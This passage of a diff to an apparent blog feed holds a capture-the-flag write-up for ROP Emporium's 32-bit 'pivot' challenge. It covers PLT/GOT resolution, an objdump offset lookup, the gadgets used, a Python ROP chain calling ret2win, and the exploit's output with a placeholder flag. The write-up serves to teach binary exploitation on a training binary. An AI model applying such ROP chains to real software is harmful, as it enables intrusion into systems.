-<p>On reading the rest of the problem description, it is understood that we need to call the <code>ret2win</code> function dynamically imported from <code>libpivot32.so</code>. But instead of <code>ret2win</code>, another function from the same library, <code>foothold_function</code> is imported and used in the binary. The rest of the challenge requires the knowledge of PLT and GOT and their working. You can read about them in Appendix A of ropemporium&rsquo;s <a href="https://ropemporium.com/guide.html" target="_blank">beginner&rsquo;s guide</a>. I would also suggest <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4" target="_blank">this</a> video since it explains the working with a working example.</p>
-
+<p>On reading the rest of the problem description, it is understood that we need to call the <code>ret2win</code> function dynamically imported from <code>libpivot32.so</code>. But instead of <code>ret2win</code>, another function from the same library, <code>foothold_function</code> is imported and used in the binary. The rest of the challenge requires the knowledge of PLT and GOT and their working. You can read about them in Appendix A of ropemporium&rsquo;s <a href="https://ropemporium.com/guide.html">beginner&rsquo;s guide</a>. I would also suggest <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4">this</a> video since it explains the working with a working example.</p>
 <p>The <code>foothold_function</code> has an entry in the GOT but it needs to be populated. So, the function has to be called. We also have to find the offset between the <code>foothold_function</code> and the <code>ret2win</code> function in <code>libpivot32.so</code>. Once, the GOT entry is populated, the address of the desired function can be calculated by adding the offset to the address of <code>foothold_function</code> and calling it.</p>
-
 <h3 id="finding-the-offset">Finding the offset</h3>
-
 <p>I used <code>objdump</code> command to dump the source assembly of <code>libpivot32.so</code> and <code>grep</code> to find their offsets from the start of the binary.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -S libpivot32.so | grep foothold_function
 <span style="color:#ae81ff">00000770</span> &lt;foothold_function&gt;:
 
 $ objdump -S libpivot32.so | grep ret2win
-<span style="color:#ae81ff">00000967</span> &lt;ret2win&gt;:</code></pre></div>
-<p>Subtracting the two values gives the offset as <code>0x1f7</code></p>
-
+<span style="color:#ae81ff">00000967</span> &lt;ret2win&gt;:
+</code></pre></div><p>Subtracting the two values gives the offset as <code>0x1f7</code></p>
 <h3 id="finding-appropriate-gadgets">Finding appropriate gadgets</h3>
-
 <p>To add offsets into registers and load data from memory, we need gadgets. Here are the gadgets used -</p>
-
 <ol>
-<li><p><code>pop ebx ; ret</code> - This is used to load a value from the top of the stack to <code>EBX</code>.</p></li>
-
-<li><p><code>add eax, ebx ; ret</code> - This will add the value of <code>EBX</code> and <code>EAX</code> and store it in <code>EAX</code></p></li>
-
-<li><p><code>mov eax, dword ptr [eax] ; ret</code> - This loads the value stored at the value in <code>EAX</code>. In simple terms, it uses the value in <code>EAX</code> as an address and the value at that address is moved into <code>EAX</code></p></li>
-
-<li><p><code>call eax</code> - This will call the address in <code>EAX</code> (should be the address of a function)</p></li>
+<li>
+<p><code>pop ebx ; ret</code> - This is used to load a value from the top of the stack to <code>EBX</code>.</p>
+</li>
+<li>
+<p><code>add eax, ebx ; ret</code> - This will add the value of <code>EBX</code> and <code>EAX</code> and store it in <code>EAX</code></p>
+</li>
+<li>
+<p><code>mov eax, dword ptr [eax] ; ret</code> - This loads the value stored at the value in <code>EAX</code>. In simple terms, it uses the value in <code>EAX</code> as an address and the value at that address is moved into <code>EAX</code></p>
+</li>
+<li>
+<p><code>call eax</code> - This will call the address in <code>EAX</code> (should be the address of a function)</p>
+</li>
 </ol>
-
 <h3 id="building-the-rop-chain">Building the ROP chain</h3>
-
 <p>Before building the ROP chain, the PLT and GOT entries of <code>foothold_function</code>, the various gadgets found and the offset are stored in variables.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># dynamically imported function - foothold_function</span>
 foothold_plt <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x80485f0</span>)
@@ -384,21 +370,20 @@ pop_ebx <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0
 <span style="color:#75715e"># add eax, ebx ; ret</span>
 add <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c7</span>)
 
-offset <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x1f7</span>)</code></pre></div>
-<p>The longer ROP chain is initialised with the PLT value of <code>foothold_function</code> since the first thing we need is to call this function to populate the GOT entry.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">=</span> foothold_plt</code></pre></div>
-<p>After this, the GOT entry contains the address of <code>foothold_function</code> in the memory. The <code>libpivot32.so</code> is brought into memory when required and assigned a starting memory address. First, the address of GOT entry is moved in <code>EAX</code> and then using the <code>mov eax, dword ptr [eax] ; ret</code> gadget, the address of the imported function is moved to <code>EAX</code>(saved at the GOT entry).</p>
+offset <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x1f7</span>)
+</code></pre></div><p>The longer ROP chain is initialised with the PLT value of <code>foothold_function</code> since the first thing we need is to call this function to populate the GOT entry.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">=</span> foothold_plt
+</code></pre></div><p>After this, the GOT entry contains the address of <code>foothold_function</code> in the memory. The <code>libpivot32.so</code> is brought into memory when required and assigned a starting memory address. First, the address of GOT entry is moved in <code>EAX</code> and then using the <code>mov eax, dword ptr [eax] ; ret</code> gadget, the address of the imported function is moved to <code>EAX</code>(saved at the GOT entry).</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> pop_eax
 long <span style="color:#f92672">+=</span> foothold_got
-long <span style="color:#f92672">+=</span> eax_val</code></pre></div>
-<p>The offset is moved to <code>EBX</code> and then added to <code>EAX</code></p>
+long <span style="color:#f92672">+=</span> eax_val
+</code></pre></div><p>The offset is moved to <code>EBX</code> and then added to <code>EAX</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> pop_ebx
 long <span style="color:#f92672">+=</span> offset
-long <span style="color:#f92672">+=</span> add</code></pre></div>
-<p>Now <code>EAX</code> contains the address of <code>ret2win</code> function and it can be called.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> call_eax</code></pre></div>
-<p>This solves the challenge and the flag is obtained. The complete <a href="https://github.com/saurabhmittal16/ropemporium/blob/master/pivot32.py" target="_blank">script</a> can be found in my Github <a href="https://github.com/saurabhmittal16/ropemporium" target="_blank">repo</a>.</p>
-
+long <span style="color:#f92672">+=</span> add
+</code></pre></div><p>Now <code>EAX</code> contains the address of <code>ret2win</code> function and it can be called.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> call_eax
+</code></pre></div><p>This solves the challenge and the flag is obtained. The complete <a href="https://github.com/saurabhmittal16/ropemporium/blob/master/pivot32.py">script</a> can be found in my Github <a href="https://github.com/saurabhmittal16/ropemporium">repo</a>.</p>
 <p>Here is the output when the script is executed</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 exploit.py
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/saurabh/Data/Exploit/ropemporium/pivot/32/pivot32&#39;</span>
@@ -412,8 +397,8 @@ long <span style="color:#f92672">+=</span> add</code></pre></div>
 Now kindly send your stack smash
 &gt;
 foothold_function<span style="color:#f92672">()</span>, check out my .got.plt entry to gain a foothold into libpivot.so
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span></code></pre></div>
-<p>That&rsquo;s the end of this post. I think that this is a great challenge for beginners since the challenge is not too difficult but still interesting to work on. Thanks for reading. Cheers!</p>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span>
+</code></pre></div><p>That&rsquo;s the end of this post. I think that this is a great challenge for beginners since the challenge is not too difficult but still interesting to work on. Thanks for reading. Cheers!</p>
 ]]></content>
         </item>
         
